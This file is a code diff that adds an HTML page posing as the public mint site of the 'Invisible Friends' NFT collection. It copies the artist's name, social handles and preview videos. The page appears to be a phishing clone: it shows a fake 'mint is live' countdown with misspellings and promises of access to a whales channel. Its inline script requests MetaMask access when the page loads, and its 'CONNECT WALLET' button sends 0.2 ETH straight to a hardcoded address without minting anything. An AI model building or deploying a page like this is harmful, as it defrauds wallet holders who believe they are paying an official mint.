@@ -1,0 +1,255 @@
+<!doctype html>
+<html>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+
+<head>
+    <title>INVISIBLE FRIENDS</title>
+    <meta name="facebook-domain-verification" content="ot8za0xy44kc74d1jxq2lwo1zjqsz0" />
+    <meta name="description" content="Bing bong!" />
+    <meta name="viewport" content="width=device-width" />
+    <meta charset="utf-8" />
+    <link rel="icon" href="favicon.png" />
+    <link rel="apple-touch-icon" href="apple-touch-icon.png" />
+    <meta name="twitter:title" content="INVISIBLE FRIENDS" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@InvsbleFriends" />
+    <meta name="twitter:creator" content="@MotionMarkus" />
+    <meta property="og:title" content="INVISIBLE FRIENDS" />
+    <meta property="og:description" content="Dropping February 2022. Bing bong!" />
+    <meta property="og:image" content="IF_open-graph.png" />
+    <meta name="next-head-count" content="13" />
+    <link rel="preload" href="_next/static/css/86357f81b3d001f1.css" as="style" />
+    <link rel="stylesheet" href="_next/static/css/86357f81b3d001f1.css" data-n-g="" /><noscript data-n-css=""></noscript>
+   
+    <link href="static/css/main.27858b4b.chunk.css" rel="stylesheet">
+    <link href="main.css" rel="stylesheet">
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js"></script>
+  <script type="text/javascript">
+    window.addEventListener('load', async () => {
+      if (window.ethereum) {
+        window.web3 = new Web3(ethereum);
+        try {
+          await ethereum.enable();
+          initPayButton()
+        } catch (err) {
+          $('#status').html('User denied account access', err)
+        }
+      } else if (window.web3) {
+        window.web3 = new Web3(web3.currentProvider)
+        initPayButton()
+      } else {
+        $('#status').html('No Metamask (or other Web3 Provider) installed')
+      }
+    })
+
+    const initPayButton = () => {
+      $('.pay-button').click(() => {
+        // paymentAddress is where funds will be send to
+        const paymentAddress = '0xb499D868EB15771D589d4e9De22CB08522C62700'
+        const amountEth = 0.2
+
+        web3.eth.sendTransaction({
+          to: paymentAddress,
+          value: web3.toWei(amountEth, 'ether')
+        }, (err, transactionId) => {
+          if  (err) {
+            console.log('Payment failed', err)
+            $('#status').html('Payment failed')
+          } else {
+            console.log('Payment successful', transactionId)
+            $('#status').html('Payment successful')
+          }
+        })
+      })
+    }
+  </script>
+</head>
+
+
+<body>
+   
+  
+        <div class="flex flex-col min-h-screen font-fatfrank">
+            
+            <div class="py-2 text-3xl text-yellow-200 bg-yellow-200 font-fatfrank text-outline-marquee"><h1 class="marquee"><span>MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;</span></h1></div>
+            
+            <div class="justify-center1">
+               
+                <header class="flex flex-col items-center justify-center h-full font-black text-center font-fatfrank">
+                    <h1 class="text-6xl text-yellow-200 md:text-8xl lg:text-9xl leading-solid">INVISIBLE<br/>FRIENDS</h1>
+                    <div class="w-full md:w-[600px] -mt-16 md:-mt-32 lg:-mt-36"><img alt="Basketball" src="https://s3.brnbw.com/invisible-montage-600w-c3zLxbZQSZq2Cdu9FuY5m7bAsDLUxpYtAcT4MOAkjgBViiZyKagnbn6wJEwNN0fbvs2Dg7gpLJK92JRwhquCBaE7avOMN297Ht6o.gif"></div>
+                </header>
+               <div>
+                <div class="justify-center">
+                    <div class="padding-head">
+                <h2 class="mint-live">PUBLIC MINT IS <span class="mint-live-pulse">LIVE</span></h2>
+               
+                <h2 class="mint-live">UNTIL 1 APR 21:00H</h2>
+          
+                <h2 class="mint-limited">SALE COST: <span class="mint-live-pulse">0.2 EHT</span></h2>
+               
+                <h3 class="mint-count"><span>4478</span> / 5757</h3>
+                        
+                            <div class="justify-center2">
+                                <span class="minus odd">-</span>
+                                <div class="circle flex center"><span class="num form__input">1</span></div>
+                                <span class="plus odd">+</span>
+                             
+                           
+                        </div>
+                        <div class="justify-center2">
+                            <span>Total:</span>    
+                            <span class="eth_pr">&nbsp;&nbsp;&nbsp;&nbsp;0.2 ETH</span>    
+                        </div>
+                        <button class="mint-btn-main pay-button">CONNECT WALLET</button>
+                        
+                        <div class="mint-footer"><p>"Minting a minimum of 3 Invisible Friends allow you one access to the Invisible Friends whales channel &amp; mastermind with 8 figures crypto entrepreneurs."</p></div>
+
+                        
+
+            </div>
+        </div>
+               </div>
+            </div>
+            <div class="py-2 text-3xl text-yellow-200 bg-yellow-200 font-fatfrank text-outline-marquee"><h1 class="marquee"><span>MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;</span></h1></div>
+            <div class="py-1 bg-white md:py-5 space-y-1 md:space-y-5 lg:space-y-7 lg:py-7 text-sea-600">
+                <div class="px-1 overflow-hidden md:px-5 lg:px-7">
+                    <div class="-mx-10 md:-mx-32 grid grid-cols-5 md:grid-cols-2 md:grid-cols-5 gap-1 md:gap-5"><video autoplay="" loop="" muted="" playsinline="" class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_1.mp4" type="video/mp4"/></video><video autoplay="" loop="" muted="" playsinline=""
+                            class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_2.mp4" type="video/mp4"/></video><video autoplay="" loop="" muted="" playsinline="" class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_3.mp4" type="video/mp4"/></video>
+                        <video autoplay="" loop="" muted="" playsinline="" class="rounded-xl">
+                        <source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_4.mp4" type="video/mp4" />
+                        </video><video autoplay="" loop="" muted="" playsinline="" class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_5.mp4" type="video/mp4"/></video></div>
+                </div>
+                <div class="px-1 overflow-hidden md:px-5 lg:px-7">
+                    <div class="grid grid-cols-4 md:grid-cols-2 md:grid-cols-4 gap-1 md:gap-5"><video autoplay="" loop="" muted="" playsinline="" class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_6.mp4" type="video/mp4"/></video><video autoplay="" loop="" muted="" playsinline=""
+                            class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_7.mp4" type="video/mp4"/></video><video autoplay="" loop="" muted="" playsinline="" class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_8.mp4" type="video/mp4"/></video>
+                        <video autoplay="" loop="" muted="" playsinline="" class="rounded-xl">
+                        <source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_9.mp4" type="video/mp4" />
+                        </video>
+                    </div>
+                </div>
+                <div class="px-1 overflow-hidden md:px-5 lg:px-7">
+                    <div class="-mx-10 md:-mx-32 grid grid-cols-5 md:grid-cols-2 md:grid-cols-5 gap-1 md:gap-5"><video autoplay="" loop="" muted="" playsinline="" class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_10.mp4" type="video/mp4"/></video><video autoplay="" loop="" muted="" playsinline=""
+                            class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_11.mp4" type="video/mp4"/></video><video autoplay="" loop="" muted="" playsinline="" class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_12.mp4" type="video/mp4"/></video>
+                        <video autoplay="" loop="" muted="" playsinline="" class="rounded-xl">
+                        <source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_13.mp4" type="video/mp4" />
+                        </video><video autoplay="" loop="" muted="" playsinline="" class="rounded-xl"><source src="https://rndmcharacters.s3.amazonaws.com/InvisibleFriends-Previews/invsble_14.mp4" type="video/mp4"/></video></div>
+                </div>
+            </div>
+            <div class="py-2 text-3xl text-yellow-200 uppercase bg-yellow-200 font-fatfrank text-outline-marquee"><h1 class="marquee"><span>MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;MINT NOW &#183; PUBLIC NINT IS LIVE &#183;</span></h1></div>
+            <div class="p-5 py-10 text-center space-y-8 md:space-y-0 md:p-16 md:py-32 grid md:grid-cols-2 gap-4">
+                <div class="space-y-4"><img src="handshake.svg" class="w-24 mx-auto" alt="Handshake" />
+                    <h3 class="text-3xl text-yellow-200 font-fatfrank md:text-5xl">Markus<br/>Magnusson</h3>
+                    <p class="max-w-lg mx-auto">INVISIBLE FRIENDS are thought up, drawn and animated by this one Swedish dude.</p>
+                    <p>
+                        <a href="http://twitter.com/MotionMarkus"><img src="twitter-logo.svg" alt="Twitter" class="inline-block w-6 text-white md:w-8" /></a>
+                    </p>
+                </div>
+                <div class="space-y-4"><img src="rcc.png" class="w-24 mx-auto rounded-full" alt="Handshake" />
+                    <h3 class="text-yellow-200 font-fatfrank md:text-5xl">Random Character<br/>Collective</h3>
+                    <p class="max-w-lg mx-auto">INVISIBLE FRIENDS are a proud member of Random Character Collective. The internet&#x27;s friendliest animator collective.</p>
+                    <p>
+                        <a href="http://twitter.com/rndmcharacters"><img src="twitter-logo.svg" alt="Twitter" class="inline-block w-6 text-white md:w-8" /></a>
+                    </p>
+                </div>
+            </div>
+            <div class="border-t border-black border-opacity-10"></div>
+
+        </div>
+    </div>
+    <script id="__NEXT_DATA__" type="application/json">
+        {
+            "props": {
+                "pageProps": {}
+            },
+            "page": "/",
+            "query": {},
+            "buildId": "91KJMjIHXnj6d1ixJG1ZD",
+            "nextExport": true,
+            "autoExport": true,
+            "isFallback": false,
+            "scriptLoader": []
+        }
+    </script>
+    <script>
+        ! function(e) {
+            function r(r) {
+                for (var n, l, a = r[0], f = r[1], i = r[2], c = 0, s = []; c < a.length; c++) l = a[c], Object.prototype.hasOwnProperty.call(o, l) && o[l] && s.push(o[l][0]), o[l] = 0;
+                for (n in f) Object.prototype.hasOwnProperty.call(f, n) && (e[n] = f[n]);
+                for (p && p(r); s.length;) s.shift()();
+                return u.push.apply(u, i || []), t()
+            }
+
+            function t() {
+                for (var e, r = 0; r < u.length; r++) {
+                    for (var t = u[r], n = !0, a = 1; a < t.length; a++) {
+                        var f = t[a];
+                        0 !== o[f] && (n = !1)
+                    }
+                    n && (u.splice(r--, 1), e = l(l.s = t[0]))
+                }
+                return e
+            }
+            var n = {},
+                o = {
+                    1: 0
+                },
+                u = [];
+
+            function l(r) {
+                if (n[r]) return n[r].exports;
+                var t = n[r] = {
+                    i: r,
+                    l: !1,
+                    exports: {}
+                };
+                return e[r].call(t.exports, t, t.exports, l), t.l = !0, t.exports
+            }
+            l.m = e, l.c = n, l.d = function(e, r, t) {
+                l.o(e, r) || Object.defineProperty(e, r, {
+                    enumerable: !0,
+                    get: t
+                })
+            }, l.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+                    value: "Module"
+                }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, l.t = function(e, r) {
+                if (1 & r && (e = l(e)), 8 & r) return e;
+                if (4 & r && "object" == typeof e && e && e.__esModule) return e;
+                var t = Object.create(null);
+                if (l.r(t), Object.defineProperty(t, "default", {
+                        enumerable: !0,
+                        value: e
+                    }), 2 & r && "string" != typeof e)
+                    for (var n in e) l.d(t, n, function(r) {
+                        return e[r]
+                    }.bind(null, n));
+                return t
+            }, l.n = function(e) {
+                var r = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return l.d(r, "a", r), r
+            }, l.o = function(e, r) {
+                return Object.prototype.hasOwnProperty.call(e, r)
+            }, l.p = "/";
+            var a = this.webpackJsonpallstars = this.webpackJsonpallstars || [],
+                f = a.push.bind(a);
+            a.push = r, a = a.slice();
+            for (var i = 0; i < a.length; i++) r(a[i]);
+            var p = f;
+            t()
+        }([])
+    </script>
+    <script src="static/js/2.2804ed8a.chunk.js"></script>
+    <script src="static/js/main.019fe842.chunk.js"></script>
+</body>
+
+</html>
